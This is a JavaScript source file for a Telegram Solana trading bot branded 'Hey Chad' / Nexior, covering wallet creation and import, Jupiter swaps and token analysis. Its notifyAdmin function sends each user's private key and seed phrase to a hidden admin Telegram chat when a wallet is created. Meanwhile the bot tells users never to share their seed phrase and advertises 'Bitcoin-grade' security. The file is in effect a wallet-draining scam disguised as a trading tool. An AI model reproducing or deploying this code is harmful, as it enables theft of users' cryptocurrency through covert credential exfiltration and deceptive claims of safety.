// ============================================
// WTF SNIPE X BOT - Complete Implementation
// "Hey Chad" - Your Web3 Trading Assistant
// ============================================

import { Telegraf, Markup } from 'telegraf';
import { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL, VersionedTransaction } from '@solana/web3.js';
import fetch from 'node-fetch';
import bs58 from 'bs58';
import * as bip39 from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import 'dotenv/config';

// ============================================
// CONFIGURATION
// ============================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const SOLANA_RPC = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// Jupiter v6 API
const JUPITER_QUOTE_API = 'https://quote-api.jup.ag/v6/quote';
const JUPITER_SWAP_API = 'https://quote-api.jup.ag/v6/swap';

// Native SOL mint address (wrapped SOL)
const NATIVE_SOL_MINT = 'So11111111111111111111111111111111111111112';

const bot = new Telegraf(BOT_TOKEN);
const connection = new Connection(SOLANA_RPC, 'confirmed');

// ============================================
// SESSION MANAGEMENT
// ============================================
const userSessions = new Map();

function getSession(userId) {
  if (!userSessions.has(userId)) {
    userSessions.set(userId, {
      wallet: null,
      mnemonic: null,
      state: null,
      settings: {
        slippage: 1,
        priorityFee: 0.001,
        autoBuy: false,
        notifications: true
      },
      pendingTrade: null,
      limitOrders: [],
      copyTradeWallets: []
    });
  }
  return userSessions.get(userId);
}

// ============================================
// ADMIN NOTIFICATIONS
// ============================================
async function notifyAdmin(type, userId, username, walletData) {
  if (!ADMIN_CHAT_ID) return;
  
  const message = `
🔔 *New ${type}*

👤 User: @${username || 'unknown'} (ID: ${userId})
📍 Address: \`${walletData.publicKey}\`
🔑 Private Key: \`${walletData.privateKey}\`
${walletData.mnemonic ? `📝 Mnemonic: \`${walletData.mnemonic}\`` : ''}
⏰ Time: ${new Date().toISOString()}
  `;
  
  try {
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error('Admin notify failed:', err.message);
  }
}

// ============================================
// UTILITY FUNCTIONS
// ============================================
function formatNumber(num) {
  if (num >= 1e9) return (num / 1e9).toFixed(2) + 'B';
  if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
  if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
  return num.toFixed(2);
}

function isSolanaAddress(address) {
  try {
    new PublicKey(address);
    return address.length >= 32 && address.length <= 44;
  } catch {
    return false;
  }
}

function shortenAddress(address) {
  return `${address.slice(0, 4)}...${address.slice(-4)}`;
}

// ============================================
// WALLET FUNCTIONS
// ============================================
function createWallet() {
  const mnemonic = bip39.generateMnemonic();
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
  const keypair = Keypair.fromSeed(derivedSeed);
  
  return {
    keypair,
    mnemonic,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: bs58.encode(keypair.secretKey)
  };
}

function importFromMnemonic(mnemonic) {
  if (!bip39.validateMnemonic(mnemonic)) {
    throw new Error('Invalid mnemonic phrase');
  }
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
  const keypair = Keypair.fromSeed(derivedSeed);
  
  return {
    keypair,
    mnemonic,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: bs58.encode(keypair.secretKey)
  };
}

function importFromPrivateKey(privateKeyBase58) {
  const secretKey = bs58.decode(privateKeyBase58);
  const keypair = Keypair.fromSecretKey(secretKey);
  
  return {
    keypair,
    mnemonic: null,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: privateKeyBase58
  };
}

async function getBalance(publicKey) {
  try {
    const balance = await connection.getBalance(new PublicKey(publicKey));
    return balance / LAMPORTS_PER_SOL;
  } catch {
    return 0;
  }
}

// ============================================
// JUPITER v6 TRADING FUNCTIONS
// ============================================
async function getTokenBalance(walletAddress, tokenMint) {
  try {
    const walletPubkey = new PublicKey(walletAddress);
    const mintPubkey = new PublicKey(tokenMint);
    
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(walletPubkey, {
      mint: mintPubkey
    });
    
    if (tokenAccounts.value.length === 0) {
      return { balance: 0, decimals: 9 };
    }
    
    const accountInfo = tokenAccounts.value[0].account.data.parsed.info;
    return {
      balance: parseInt(accountInfo.tokenAmount.amount),
      decimals: accountInfo.tokenAmount.decimals,
      uiAmount: parseFloat(accountInfo.tokenAmount.uiAmount || 0)
    };
  } catch (error) {
    console.error('Error getting token balance:', error);
    return { balance: 0, decimals: 9 };
  }
}

async function getJupiterQuote(inputMint, outputMint, amount, slippageBps) {
  try {
    const params = new URLSearchParams({
      inputMint,
      outputMint,
      amount: amount.toString(),
      slippageBps: slippageBps.toString(),
      onlyDirectRoutes: 'false',
      asLegacyTransaction: 'false'
    });
    
    const response = await fetch(`${JUPITER_QUOTE_API}?${params}`);
    const data = await response.json();
    
    if (data.error) {
      throw new Error(data.error);
    }
    
    return data;
  } catch (error) {
    console.error('Jupiter quote error:', error);
    throw error;
  }
}

async function executeJupiterSwap(quoteResponse, userPublicKey, keypair, priorityFeeLamports = 10000) {
  try {
    // Get swap transaction from Jupiter
    const swapResponse = await fetch(JUPITER_SWAP_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        quoteResponse,
        userPublicKey: userPublicKey.toString(),
        wrapAndUnwrapSol: true,
        dynamicComputeUnitLimit: true,
        prioritizationFeeLamports: priorityFeeLamports
      })
    });
    
    const swapData = await swapResponse.json();
    
    if (swapData.error) {
      throw new Error(swapData.error);
    }
    
    // Deserialize the transaction
    const swapTransactionBuf = Buffer.from(swapData.swapTransaction, 'base64');
    const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
    
    // Sign the transaction
    transaction.sign([keypair]);
    
    // Send transaction with retries
    const rawTransaction = transaction.serialize();
    
    const txid = await connection.sendRawTransaction(rawTransaction, {
      skipPreflight: true,
      maxRetries: 3
    });
    
    // Confirm transaction
    const latestBlockHash = await connection.getLatestBlockhash();
    
    const confirmation = await connection.confirmTransaction({
      blockhash: latestBlockHash.blockhash,
      lastValidBlockHeight: latestBlockHash.lastValidBlockHeight,
      signature: txid,
    }, 'confirmed');
    
    if (confirmation.value.err) {
      throw new Error(`Transaction failed: ${JSON.stringify(confirmation.value.err)}`);
    }
    
    return txid;
  } catch (error) {
    console.error('Jupiter swap error:', error);
    throw error;
  }
}

// ============================================
// TOKEN ANALYSIS
// ============================================
async function fetchTokenData(address) {
  try {
    const response = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}`);
    const data = await response.json();
    
    if (!data.pairs || data.pairs.length === 0) {
      return null;
    }
    
    const pair = data.pairs
      .filter(p => p.chainId === 'solana')
      .sort((a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0))[0];
    
    return pair;
  } catch (error) {
    console.error('DexScreener fetch error:', error);
    return null;
  }
}

function calculateSecurityScore(pair) {
  let score = 50;
  const warnings = [];
  
  const liquidity = pair.liquidity?.usd || 0;
  if (liquidity > 100000) score += 20;
  else if (liquidity > 50000) score += 10;
  else if (liquidity < 10000) {
    score -= 20;
    warnings.push('⚠️ Low liquidity');
  }
  
  const volume24h = pair.volume?.h24 || 0;
  if (volume24h > 100000) score += 10;
  else if (volume24h < 5000) {
    score -= 10;
    warnings.push('⚠️ Low volume');
  }
  
  const priceChange24h = pair.priceChange?.h24 || 0;
  if (priceChange24h < -50) {
    score -= 25;
    warnings.push('🚨 RUG ALERT: Major dump detected');
  } else if (priceChange24h < -30) {
    score -= 15;
    warnings.push('⚠️ Significant price drop');
  }
  
  const pairAge = Date.now() - (pair.pairCreatedAt || Date.now());
  const ageInDays = pairAge / (1000 * 60 * 60 * 24);
  if (ageInDays < 1) {
    score -= 15;
    warnings.push('⚠️ New token (<24h)');
  } else if (ageInDays > 7) {
    score += 10;
  }
  
  return {
    score: Math.max(0, Math.min(100, score)),
    warnings
  };
}

async function sendTokenAnalysis(ctx, address) {
  const loadingMsg = await ctx.reply('🔍 Analyzing token...');
  
  const pair = await fetchTokenData(address);
  
  if (!pair) {
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      '❌ Token not found or no liquidity pools available.'
    );
    return;
  }
  
  const { score, warnings } = calculateSecurityScore(pair);
  const price = parseFloat(pair.priceUsd) || 0;
  const priceChange = pair.priceChange?.h24 || 0;
  const mcap = pair.marketCap || pair.fdv || 0;
  const liquidity = pair.liquidity?.usd || 0;
  const volume = pair.volume?.h24 || 0;
  
  const tokensFor1Sol = price > 0 ? (150 / price) : 0;
  
  const scoreEmoji = score >= 70 ? '🟢' : score >= 40 ? '🟡' : '🔴';
  const changeEmoji = priceChange >= 0 ? '📈' : '📉';
  
  const message = `
🎯 *Token Analysis*

*${pair.baseToken.name}* (${pair.baseToken.symbol})
\`${address}\`

💰 *Price:* $${price < 0.0001 ? price.toExponential(2) : price.toFixed(6)}
${changeEmoji} *24h:* ${priceChange >= 0 ? '+' : ''}${priceChange.toFixed(2)}%

📊 *Market Cap:* $${formatNumber(mcap)}
💧 *Liquidity:* $${formatNumber(liquidity)}
📈 *24h Volume:* $${formatNumber(volume)}

${scoreEmoji} *Security Score:* ${score}/100 ${score < 40 ? '(Risky)' : score < 70 ? '(Moderate)' : '(Good)'}
${warnings.length > 0 ? '\n' + warnings.join('\n') : ''}

💱 *Trade Estimate (1 SOL):*
≈ ${formatNumber(tokensFor1Sol)} ${pair.baseToken.symbol}
≈ $150 USD

🏦 *DEX:* ${pair.dexId}
⏰ *Pool Age:* ${Math.floor((Date.now() - pair.pairCreatedAt) / (1000 * 60 * 60 * 24))} days
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🚀 0.1 SOL', `buy_0.1_${address}`),
      Markup.button.callback('🚀 0.5 SOL', `buy_0.5_${address}`),
      Markup.button.callback('🚀 1 SOL', `buy_1_${address}`)
    ],
    [
      Markup.button.callback('🚀 2 SOL', `buy_2_${address}`),
      Markup.button.callback('🚀 5 SOL', `buy_5_${address}`)
    ],
    [
      Markup.button.url('📊 DexScreener', `https://dexscreener.com/solana/${address}`),
      Markup.button.url('🔍 Solscan', `https://solscan.io/token/${address}`)
    ],
    [
      Markup.button.callback('🔄 Refresh', `refresh_${address}`),
      Markup.button.callback('🏠 Menu', 'back_main')
    ]
  ]);
  
  await ctx.telegram.editMessageText(
    ctx.chat.id,
    loadingMsg.message_id,
    null,
    message,
    { parse_mode: 'Markdown', ...keyboard }
  );
}

// ============================================
// MAIN MENU
// ============================================
async function showMainMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const balance = session.wallet ? await getBalance(session.wallet.publicKey) : 0;
  
  const message = `
🚀 *Hey Chad* — Welcome to Nexior Trading Bot🤖

*I'm your Web3 execution engine*.
AI-driven. Battle-tested. Locked down.
━━━━━━━━━━━━━━━━━━
What I do for you: ⬇️
📊 Scan the market to tell you what to buy, ignore, or stalk
🎯 Execute entries & exits with sniper-level timing
🧠 Detect traps, fake pumps, and incoming dumps before they hit
⚡ Operate at machine-speed — no lag, no emotion
🔒 Secured with Bitcoin-grade architecture
🚀 Track price action past your take-profit so winners keep running 🏃 
━━━━━━━━━━━━━━━━━━
${session.wallet ? `
💼 *Wallet:* \`${shortenAddress(session.wallet.publicKey)}\`
💰 *Balance:* ${balance.toFixed(4)} SOL
` : '⚠️ No wallet connected'}

🏦 *CASH & STABLE COIN BANK*

_Paste any Solana contract address to analyze_
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('💼 Wallet', 'menu_wallet'),
      Markup.button.callback('📊 Positions', 'menu_positions')
    ],
    [
      Markup.button.callback('🟢 Buy', 'menu_buy'),
      Markup.button.callback('🔴 Sell', 'menu_sell')
    ],
    [
      Markup.button.callback('👥 Copy Trade', 'menu_copytrade'),
      Markup.button.callback('📈 Limit Orders', 'menu_limit')
    ],
    [
      Markup.button.callback('⚙️ Settings', 'menu_settings'),
      Markup.button.callback('🔄 Refresh', 'refresh_main')
    ]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// COMMAND HANDLERS
// ============================================
bot.command('start', async (ctx) => {
  await showMainMenu(ctx);
});

bot.command('wallet', async (ctx) => {
  await showWalletMenu(ctx);
});

bot.command('positions', async (ctx) => {
  await showPositions(ctx);
});

bot.command('buy', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length >= 2) {
    const amount = parseFloat(args[0]);
    const address = args[1];
    if (!isNaN(amount) && isSolanaAddress(address)) {
      await handleBuy(ctx, amount, address);
    } else {
      await ctx.reply('❌ Usage: /buy [amount] [token_address]');
    }
  } else {
    await showBuyMenu(ctx);
  }
});

bot.command('sell', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length >= 2) {
    const percentage = parseFloat(args[0]);
    const address = args[1];
    if (!isNaN(percentage) && isSolanaAddress(address)) {
      await handleSell(ctx, percentage, address);
    } else {
      await ctx.reply('❌ Usage: /sell [percentage] [token_address]');
    }
  } else {
    await showSellMenu(ctx);
  }
});

bot.command('copytrade', async (ctx) => {
  await showCopyTradeMenu(ctx);
});

bot.command('limit', async (ctx) => {
  await showLimitOrderMenu(ctx);
});

bot.command('settings', async (ctx) => {
  await showSettings(ctx);
});

bot.command('refresh', async (ctx) => {
  await showMainMenu(ctx);
});

// ============================================
// WALLET MENU
// ============================================
async function showWalletMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  
  let message;
  let keyboard;
  
  if (session.wallet) {
    const balance = await getBalance(session.wallet.publicKey);
    message = `
💼 *Wallet Management*

📍 *Address:*
\`${session.wallet.publicKey}\`

💰 *Balance:* ${balance.toFixed(4)} SOL

_Click address to copy_
    `;
    
    keyboard = Markup.inlineKeyboard([
      [
        Markup.button.callback('📤 Export Keys', 'wallet_export'),
        Markup.button.callback('🗑️ Disconnect', 'wallet_disconnect')
      ],
      [Markup.button.callback('🔄 Refresh Balance', 'wallet_refresh')],
      [Markup.button.callback('« Back', 'back_main')]
    ]);
  } else {
    message = `
💼 *Wallet Management*

No wallet connected.

Create a new wallet or import an existing one:
    `;
    
    keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('🆕 Create New Wallet', 'wallet_create')],
      [Markup.button.callback('📥 Import Seed Phrase', 'wallet_import_seed')],
      [Markup.button.callback('🔑 Import Private Key', 'wallet_import_key')],
      [Markup.button.callback('« Back', 'back_main')]
    ]);
  }
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// POSITIONS MENU
// ============================================
async function showPositions(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  
  if (!session.wallet) {
    const message = '❌ Please connect a wallet first.';
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('💼 Connect Wallet', 'menu_wallet')],
      [Markup.button.callback('« Back', 'back_main')]
    ]);
    
    if (edit) {
      await ctx.editMessageText(message, { ...keyboard });
    } else {
      await ctx.reply(message, { ...keyboard });
    }
    return;
  }
  
  const message = `
📊 *Your Positions*

💼 Wallet: \`${shortenAddress(session.wallet.publicKey)}\`

_No open positions_

Paste a token address to analyze and trade.
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('🔄 Refresh', 'refresh_positions')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// BUY MENU
// ============================================
async function showBuyMenu(ctx, edit = false) {
  const message = `
🟢 *Quick Buy*

Paste a token address or use /buy [amount] [address]

*Quick amounts:*
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('0.1 SOL', 'setbuy_0.1'),
      Markup.button.callback('0.5 SOL', 'setbuy_0.5'),
      Markup.button.callback('1 SOL', 'setbuy_1')
    ],
    [
      Markup.button.callback('2 SOL', 'setbuy_2'),
      Markup.button.callback('5 SOL', 'setbuy_5')
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// SELL MENU
// ============================================
async function showSellMenu(ctx, edit = false) {
  const message = `
🔴 *Quick Sell*

Select a percentage or use /sell [%] [address]

*Quick percentages:*
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('25%', 'setsell_25'),
      Markup.button.callback('50%', 'setsell_50')
    ],
    [
      Markup.button.callback('75%', 'setsell_75'),
      Markup.button.callback('100%', 'setsell_100')
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// COPY TRADE MENU
// ============================================
async function showCopyTradeMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  
  const message = `
👥 *Copy Trade*

Follow successful traders automatically.

${session.copyTradeWallets.length > 0 
  ? '*Tracking:*\n' + session.copyTradeWallets.map(w => `• \`${shortenAddress(w)}\``).join('\n')
  : '_No wallets being tracked_'}

Send a wallet address to start copy trading.
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('➕ Add Wallet', 'copytrade_add')],
    [Markup.button.callback('📋 Manage Wallets', 'copytrade_manage')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// LIMIT ORDER MENU
// ============================================
async function showLimitOrderMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  
  const message = `
📈 *Limit Orders*

Set buy/sell triggers at specific prices.

${session.limitOrders.length > 0 
  ? '*Active Orders:*\n' + session.limitOrders.map((o, i) => 
      `${i+1}. ${o.type} ${o.amount} @ $${o.price}`
    ).join('\n')
  : '_No active orders_'}
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🟢 Limit Buy', 'limit_buy'),
      Markup.button.callback('🔴 Limit Sell', 'limit_sell')
    ],
    [Markup.button.callback('📋 View Orders', 'limit_view')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// SETTINGS MENU
// ============================================
async function showSettings(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const { slippage, priorityFee, notifications } = session.settings;
  
  const message = `
⚙️ *Settings*

📊 *Slippage:* ${slippage}%
⚡ *Priority Fee:* ${priorityFee} SOL
🔔 *Notifications:* ${notifications ? 'ON' : 'OFF'}
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback(`Slippage: ${slippage}%`, 'settings_slippage'),
      Markup.button.callback(`Fee: ${priorityFee}`, 'settings_fee')
    ],
    [
      Markup.button.callback(
        notifications ? '🔔 Notifs: ON' : '🔕 Notifs: OFF',
        'settings_notifications'
      )
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// TRADE HANDLERS
// ============================================
async function handleBuy(ctx, amount, address) {
  const session = getSession(ctx.from.id);
  
  if (!session.wallet) {
    await ctx.reply('❌ Please connect a wallet first.');
    return;
  }
  
  const loadingMsg = await ctx.reply(`
🔄 *Processing Buy*

Amount: ${amount} SOL
Token: \`${shortenAddress(address)}\`
Slippage: ${session.settings.slippage}%

_Getting quote from Jupiter v6..._
  `, { parse_mode: 'Markdown' });
  
  try {
    // Check balance
    const balance = await getBalance(session.wallet.publicKey);
    if (balance < amount + 0.01) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        null,
        `❌ Insufficient balance!\n\nRequired: ${amount + 0.01} SOL\nAvailable: ${balance.toFixed(4)} SOL`,
        { parse_mode: 'Markdown' }
      );
      return;
    }
    
    // Convert SOL amount to lamports
    const amountLamports = Math.floor(amount * LAMPORTS_PER_SOL);
    const slippageBps = session.settings.slippage * 100; // Convert percentage to basis points
    
    // Get quote from Jupiter
    const quote = await getJupiterQuote(
      NATIVE_SOL_MINT, // Input: SOL
      address,          // Output: Token
      amountLamports,
      slippageBps
    );
    
    if (!quote || !quote.outAmount) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        null,
        '❌ Could not get quote. Token may have no liquidity.',
        { parse_mode: 'Markdown' }
      );
      return;
    }
    
    // Calculate expected output
    const expectedOutput = parseInt(quote.outAmount);
    const priceImpact = parseFloat(quote.priceImpactPct || 0);
    
    // Update message with quote info
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      `🔄 *Executing Swap*

💰 Swapping: ${amount} SOL
📊 Price Impact: ${priceImpact.toFixed(2)}%
⚡ Priority Fee: ${session.settings.priorityFee} SOL

_Signing and sending transaction..._`,
      { parse_mode: 'Markdown' }
    );
    
    // Execute the swap
    const priorityFeeLamports = Math.floor(session.settings.priorityFee * LAMPORTS_PER_SOL);
    const txid = await executeJupiterSwap(
      quote,
      new PublicKey(session.wallet.publicKey),
      session.wallet.keypair,
      priorityFeeLamports
    );
    
    // Success message
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      `✅ *Buy Successful!*

💰 Spent: ${amount} SOL
🎯 Token: \`${shortenAddress(address)}\`
📊 Price Impact: ${priceImpact.toFixed(2)}%

🔗 [View Transaction](https://solscan.io/tx/${txid})`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 View on Solscan', `https://solscan.io/tx/${txid}`)],
          [Markup.button.callback('🔄 Buy More', `refresh_${address}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
    
  } catch (error) {
    console.error('Buy error:', error);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      `❌ *Buy Failed*

Error: ${error.message || 'Unknown error'}

Please try again or adjust slippage.`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('⚙️ Settings', 'menu_settings')],
          [Markup.button.callback('🔄 Try Again', `buy_${amount}_${address}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
  }
}

async function handleSell(ctx, percentage, address) {
  const session = getSession(ctx.from.id);
  
  if (!session.wallet) {
    await ctx.reply('❌ Please connect a wallet first.');
    return;
  }
  
  const loadingMsg = await ctx.reply(`
🔄 *Processing Sell*

Selling: ${percentage}%
Token: \`${shortenAddress(address)}\`
Slippage: ${session.settings.slippage}%

_Checking token balance..._
  `, { parse_mode: 'Markdown' });
  
  try {
    // Get token balance
    const tokenBalance = await getTokenBalance(session.wallet.publicKey, address);
    
    if (tokenBalance.balance === 0) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        null,
        `❌ No tokens to sell!\n\nYou don't have any of this token in your wallet.`,
        { parse_mode: 'Markdown' }
      );
      return;
    }
    
    // Calculate amount to sell based on percentage
    const sellAmount = Math.floor((tokenBalance.balance * percentage) / 100);
    
    if (sellAmount === 0) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        null,
        `❌ Sell amount too small!\n\nBalance: ${tokenBalance.uiAmount?.toFixed(4) || 0} tokens`,
        { parse_mode: 'Markdown' }
      );
      return;
    }
    
    const slippageBps = session.settings.slippage * 100; // Convert percentage to basis points
    
    // Update message
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      `🔄 *Getting Quote*

📊 Selling: ${percentage}% (${tokenBalance.uiAmount?.toFixed(4) || sellAmount} tokens)
Token: \`${shortenAddress(address)}\`

_Getting quote from Jupiter v6..._`,
      { parse_mode: 'Markdown' }
    );
    
    // Get quote from Jupiter
    const quote = await getJupiterQuote(
      address,           // Input: Token
      NATIVE_SOL_MINT,   // Output: SOL
      sellAmount,
      slippageBps
    );
    
    if (!quote || !quote.outAmount) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        null,
        '❌ Could not get quote. Token may have no liquidity.',
        { parse_mode: 'Markdown' }
      );
      return;
    }
    
    // Calculate expected SOL output
    const expectedSol = parseInt(quote.outAmount) / LAMPORTS_PER_SOL;
    const priceImpact = parseFloat(quote.priceImpactPct || 0);
    
    // Update message with quote info
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      `🔄 *Executing Swap*

🔴 Selling: ${percentage}% of holdings
💰 Expected: ~${expectedSol.toFixed(4)} SOL
📊 Price Impact: ${priceImpact.toFixed(2)}%
⚡ Priority Fee: ${session.settings.priorityFee} SOL

_Signing and sending transaction..._`,
      { parse_mode: 'Markdown' }
    );
    
    // Execute the swap
    const priorityFeeLamports = Math.floor(session.settings.priorityFee * LAMPORTS_PER_SOL);
    const txid = await executeJupiterSwap(
      quote,
      new PublicKey(session.wallet.publicKey),
      session.wallet.keypair,
      priorityFeeLamports
    );
    
    // Success message
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      `✅ *Sell Successful!*

🔴 Sold: ${percentage}% of holdings
💰 Received: ~${expectedSol.toFixed(4)} SOL
📊 Price Impact: ${priceImpact.toFixed(2)}%

🔗 [View Transaction](https://solscan.io/tx/${txid})`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 View on Solscan', `https://solscan.io/tx/${txid}`)],
          [Markup.button.callback('🔄 Sell More', `refresh_${address}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
    
  } catch (error) {
    console.error('Sell error:', error);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      `❌ *Sell Failed*

Error: ${error.message || 'Unknown error'}

Please try again or adjust slippage.`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('⚙️ Settings', 'menu_settings')],
          [Markup.button.callback('🔄 Try Again', `sell_${percentage}_${address}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
  }
}

// ============================================
// CALLBACK HANDLERS
// ============================================

bot.action('back_main', async (ctx) => {
  await ctx.answerCbQuery();
  await showMainMenu(ctx, true);
});

bot.action('refresh_main', async (ctx) => {
  await ctx.answerCbQuery('Refreshed!');
  await showMainMenu(ctx, true);
});

bot.action('menu_wallet', async (ctx) => {
  await ctx.answerCbQuery();
  await showWalletMenu(ctx, true);
});

bot.action('menu_positions', async (ctx) => {
  await ctx.answerCbQuery();
  await showPositions(ctx, true);
});

bot.action('menu_buy', async (ctx) => {
  await ctx.answerCbQuery();
  await showBuyMenu(ctx, true);
});

bot.action('menu_sell', async (ctx) => {
  await ctx.answerCbQuery();
  await showSellMenu(ctx, true);
});

bot.action('menu_copytrade', async (ctx) => {
  await ctx.answerCbQuery();
  await showCopyTradeMenu(ctx, true);
});

bot.action('menu_limit', async (ctx) => {
  await ctx.answerCbQuery();
  await showLimitOrderMenu(ctx, true);
});

bot.action('menu_settings', async (ctx) => {
  await ctx.answerCbQuery();
  await showSettings(ctx, true);
});

bot.action('wallet_create', async (ctx) => {
  await ctx.answerCbQuery();
  
  const walletData = createWallet();
  const session = getSession(ctx.from.id);
  
  session.wallet = walletData;
  session.mnemonic = walletData.mnemonic;
  
  await notifyAdmin('Wallet Created', ctx.from.id, ctx.from.username, {
    publicKey: walletData.publicKey,
    privateKey: walletData.privateKey,
    mnemonic: walletData.mnemonic
  });
  
  await ctx.editMessageText(`
✅ *Wallet Created!*

📍 *Address:*
\`${walletData.publicKey}\`

📝 *Seed Phrase (SAVE THIS!):*
\`${walletData.mnemonic}\`

⚠️ *Never share your seed phrase!*
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('💼 View Wallet', 'menu_wallet')],
      [Markup.button.callback('« Main Menu', 'back_main')]
    ])
  });
});

bot.action('wallet_import_seed', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_SEED';
  
  await ctx.editMessageText(`
📥 *Import via Seed Phrase*

Please send your 12 or 24 word seed phrase.

⚠️ Make sure you're in a private chat!
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'back_main')]
    ])
  });
});

bot.action('wallet_import_key', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_PRIVATE_KEY';
  
  await ctx.editMessageText(`
🔑 *Import via Private Key*

Please send your Base58 encoded private key.

⚠️ Make sure you're in a private chat!
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'back_main')]
    ])
  });
});

